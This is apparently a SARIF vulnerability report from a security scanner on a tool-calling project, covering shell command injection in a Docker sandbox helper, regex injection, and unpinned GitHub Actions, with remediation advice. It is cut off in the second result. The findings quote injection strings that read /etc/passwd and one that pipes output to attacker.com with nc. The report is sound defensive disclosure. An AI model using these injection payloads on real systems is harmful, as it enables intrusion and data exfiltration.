{
  "version": "2.1.0",
  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "Strix",
          "informationUri": "https://strix.ai",
          "rules": [
            {
              "id": "CWE-78",
              "name": "Command Injection in Docker Sandbox via CLI/MCP arguments",
              "shortDescription": {
                "text": "Command Injection in Docker Sandbox via CLI/MCP arguments"
              },
              "fullDescription": {
                "text": "The `invokeInSandbox` and `invokeInSandboxCapture` functions in `core/sandbox.js` construct a shell command string by concatenating user-supplied CLI arguments with setup commands, then pass the result to `sh -c`. This allows an attacker to inject arbitrary shell commands through carefully crafted arguments."
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "help": {
                "text": "The `invokeInSandbox` and `invokeInSandboxCapture` functions in `core/sandbox.js` construct a shell command string by concatenating user-supplied CLI arguments with setup commands, then pass the result to `sh -c`. This allows an attacker to inject arbitrary shell commands through carefully crafted arguments.\n\nAn attacker who can control the arguments passed to the `invoke` CLI command or the MCP `run_tool` tool can execute arbitrary commands inside the Docker container. While the container is network-isolated (`--network none`) and runs as a non-root user, the attacker could still read files mounted into the container (the tool's source code directory), exfiltrate data through available channels, or exploit other container escape vulnerabilities.\n\nReplace the shell command construction with a safe execution model. Instead of concatenating arguments into a shell string passed to `sh -c`, use one of these approaches:\n\n1. **Array-based execution**: Pass the command and arguments as separate array elements to the container using Docker's exec form. Write the command to a temporary script file inside the container with proper escaping, then execute it.\n\n2. **Input validation**: Validate and sanitize all user arguments against a strict allowlist of permitted characters (alphanumeric, spaces, common CLI flags) before constructing the command.\n\n3. **Use Docker exec form**: Replace `'sh', '-c', finalCmd` with direct command execution using array-style arguments that bypass shell interpretation entirely.\n\nAdditionally, sanitize `tool.install.command` from `tools.json` by validating it against an allowlist of known-safe commands rather than passing it directly to the shell.",
                "markdown": "The `invokeInSandbox` and `invokeInSandboxCapture` functions in `core/sandbox.js` construct a shell command string by concatenating user-supplied CLI arguments with setup commands, then pass the result to `sh -c`. This allows an attacker to inject arbitrary shell commands through carefully crafted arguments.\n\nAn attacker who can control the arguments passed to the `invoke` CLI command or the MCP `run_tool` tool can execute arbitrary commands inside the Docker container. While the container is network-isolated (`--network none`) and runs as a non-root user, the attacker could still read files mounted into the container (the tool's source code directory), exfiltrate data through available channels, or exploit other container escape vulnerabilities.\n\nReplace the shell command construction with a safe execution model. Instead of concatenating arguments into a shell string passed to `sh -c`, use one of these approaches:\n\n1. **Array-based execution**: Pass the command and arguments as separate array elements to the container using Docker's exec form. Write the command to a temporary script file inside the container with proper escaping, then execute it.\n\n2. **Input validation**: Validate and sanitize all user arguments against a strict allowlist of permitted characters (alphanumeric, spaces, common CLI flags) before constructing the command.\n\n3. **Use Docker exec form**: Replace `'sh', '-c', finalCmd` with direct command execution using array-style arguments that bypass shell interpretation entirely.\n\nAdditionally, sanitize `tool.install.command` from `tools.json` by validating it against an allowlist of known-safe commands rather than passing it directly to the shell."
              },
              "properties": {
                "security-severity": "8.6",
                "tags": [
                  "security",
                  "CWE-78",
                  "stride:T",
                  "stride:E"
                ]
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/78.html"
            },
            {
              "id": "CWE-185",
              "name": "Regex Injection and ReDoS in scan-tool.js description processing",
              "shortDescription": {
                "text": "Regex Injection and ReDoS in scan-tool.js description processing"
              },
              "fullDescription": {
                "text": "The scan-tool.js script constructs a regular expression using user-controlled values from GitHub URLs (owner and repo names) without escaping special regex characters, potentially allowing regex injection and ReDoS attacks."
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "help": {
                "text": "The scan-tool.js script constructs a regular expression using user-controlled values from GitHub URLs (owner and repo names) without escaping special regex characters, potentially allowing regex injection and ReDoS attacks.\n\nAn attacker who controls a GitHub repository name containing regex metacharacters could cause unexpected matching behavior or, in worst case, trigger catastrophic backtracking in the regex engine leading to denial of service during tool scanning operations.\n\nEscape special regex characters in owner and repo names before interpolating them into the RegExp constructor. Use a helper function like String.prototype.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&') to escape all regex metacharacters. Alternatively, use string.includes() or string.startsWith() for simple substring matching instead of regex when possible.",
                "markdown": "The scan-tool.js script constructs a regular expression using user-controlled values from GitHub URLs (owner and repo names) without escaping special regex characters, potentially allowing regex injection and ReDoS attacks.\n\nAn attacker who controls a GitHub repository name containing regex metacharacters could cause unexpected matching behavior or, in worst case, trigger catastrophic backtracking in the regex engine leading to denial of service during tool scanning operations.\n\nEscape special regex characters in owner and repo names before interpolating them into the RegExp constructor. Use a helper function like String.prototype.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&') to escape all regex metacharacters. Alternatively, use string.includes() or string.startsWith() for simple substring matching instead of regex when possible."
              },
              "properties": {
                "security-severity": "4.2",
                "tags": [
                  "security",
                  "CWE-185",
                  "stride:T",
                  "stride:I"
                ]
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/185.html"
            },
            {
              "id": "CWE-829",
              "name": "Mutable GitHub Actions references in workflow files",
              "shortDescription": {
                "text": "Mutable GitHub Actions references in workflow files"
              },
              "fullDescription": {
                "text": "GitHub Actions workflow files use mutable tag references (e.g., actions/checkout@v4, actions/setup-node@v4) instead of pinned commit SHAs, exposing the CI/CD pipeline to supply-chain attacks."
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "help": {
                "text": "GitHub Actions workflow files use mutable tag references (e.g., actions/checkout@v4, actions/setup-node@v4) instead of pinned commit SHAs, exposing the CI/CD pipeline to supply-chain attacks.\n\nIf an attacker compromises a GitHub Action repository or if the action maintainer's account is taken over, the mutable @v4 reference could be updated to point to a malicious version, enabling code execution in the CI/CD pipeline with repository write permissions.\n\nPin all GitHub Action references to their full 40-character commit SHA instead of mutable tags. For example, change actions/checkout@v4 to actions/checkout@b4ffde65f16936253d0b0a9c6d5a3e8e7c1d2f3a. Use tools like renovate bot or dependabot with the sha pinning option to automate this process.",
                "markdown": "GitHub Actions workflow files use mutable tag references (e.g., actions/checkout@v4, actions/setup-node@v4) instead of pinned commit SHAs, exposing the CI/CD pipeline to supply-chain attacks.\n\nIf an attacker compromises a GitHub Action repository or if the action maintainer's account is taken over, the mutable @v4 reference could be updated to point to a malicious version, enabling code execution in the CI/CD pipeline with repository write permissions.\n\nPin all GitHub Action references to their full 40-character commit SHA instead of mutable tags. For example, change actions/checkout@v4 to actions/checkout@b4ffde65f16936253d0b0a9c6d5a3e8e7c1d2f3a. Use tools like renovate bot or dependabot with the sha pinning option to automate this process."
              },
              "properties": {
                "security-severity": "4.2",
                "tags": [
                  "security",
                  "CWE-829",
                  "stride:T",
                  "stride:I"
                ]
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/829.html"
            }
          ],
          "version": "1.1.0"
        }
      },
      "results": [
        {
          "ruleId": "CWE-78",
          "ruleIndex": 0,
          "level": "error",
          "message": {
            "text": "Command Injection in Docker Sandbox via CLI/MCP arguments\n\nThe `invokeInSandbox` and `invokeInSandboxCapture` functions in `core/sandbox.js` construct a shell command string by concatenating user-supplied CLI arguments with setup commands, then pass the result to `sh -c`. This allows an attacker to inject arbitrary shell commands through carefully crafted arguments."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/core/sandbox.js",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "1a929766c09d9911328b2864c656681982d49f75b78b44d4f8db6fd7cc79498b"
          },
          "properties": {
            "security-severity": "8.6",
            "strix_vuln_class_hash": "12c6db8d05ce36b63d97441c58bd0dc6c7081ec04fd9309c5b5fd83b0f6605fd",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0001",
              "severity": "high",
              "cvss": 8.6,
              "timestamp": "2026-07-26 03:34:48 UTC",
              "target": "D:\\Self-developed_Apps\\Tool-Calling (workspace: /workspace/Tool-Calling)",
              "endpoint": "/core/sandbox.js",
              "method": "POST",
              "cwe": "CWE-78",
              "impact": "An attacker who can control the arguments passed to the `invoke` CLI command or the MCP `run_tool` tool can execute arbitrary commands inside the Docker container. While the container is network-isolated (`--network none`) and runs as a non-root user, the attacker could still read files mounted into the container (the tool's source code directory), exfiltrate data through available channels, or exploit other container escape vulnerabilities.",
              "technical_analysis": "The vulnerability exists in `core/sandbox.js` in the `buildDockerArgs` function (lines 91-114). The function constructs a shell command as follows:\n\n```javascript\nconst setupCmd = getSetupCommand(targetDir, tool);  // May contain tool.install.command\nconst userCmd = args.join(' ');                      // Direct concatenation of CLI/MCP args\nconst finalCmd = `${setupCmd}${userCmd || 'echo \"No command provided\"'}`;\n```\n\nThe `finalCmd` is then passed to Docker as:\n```javascript\n'sh', '-c', finalCmd\n```\n\nSince `spawnSync('docker', dockerArgs)` passes `finalCmd` as a single string argument to `sh -c`, any shell metacharacters in the `args` array are interpreted by the shell. For example:\n\n- `node cli.js invoke some-tool \"; cat /etc/passwd; echo PWNED\"` would execute `cat /etc/passwd` inside the container.\n- `node cli.js invoke some-tool \"$(whoami)\"` would execute command substitution.\n- Through the MCP server, `run_tool` with `args: [\"| nc attacker.com 4444\"]` would pipe output to an external host.\n\nThe `getSetupCommand` function (line 36-65) also concatenates `tool.install.command` directly into the shell command without sanitization, meaning a malicious entry in `tools.json` could also trigger command injection even without CLI args.",
              "remediation_steps": "Replace the shell command construction with a safe execution model. Instead of concatenating arguments into a shell string passed to `sh -c`, use one of these approaches:\n\n1. **Array-based execution**: Pass the command and arguments as separate array elements to the container using Docker's exec form. Write the command to a temporary script file inside the container with proper escaping, then execute it.\n\n2. **Input validation**: Validate and sanitize all user arguments against a strict allowlist of permitted characters (alphanumeric, spaces, common CLI flags) before constructing the command.\n\n3. **Use Docker exec form**: Replace `'sh', '-c', finalCmd` with direct command execution using array-style arguments that bypass shell interpretation entirely.\n\nAdditionally, sanitize `tool.install.command` from `tools.json` by validating it against an allowlist of known-safe commands rather than passing it directly to the shell.",
              "poc": {
                "description": "1. Identify a registered tool in the registry (e.g., any tool with ID like `ppt-master`).\n2. Run the CLI invoke command with shell metacharacters in the arguments:\n   `node cli.js invoke ppt-master \"; id; echo INJECTED\"`\n3. Observe that the injected `id` and `echo INJECTED` commands execute inside the Docker container's shell.\n4. Alternatively, through the MCP server, call the `run_tool` method with `args: [\"$(whoami)\"]` and observe the output contains the container user information.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-185",
          "ruleIndex": 1,
          "level": "warning",
          "message": {
            "text": "Regex Injection and ReDoS in scan-tool.js description processing\n\nThe scan-tool.js script constructs a regular expression using user-controlled values from GitHub URLs (owner and repo names) without escaping special regex characters, potentially allowing regex injection and ReDoS attacks."
          },
          "locations": [
            {
              "physicalLocation": {
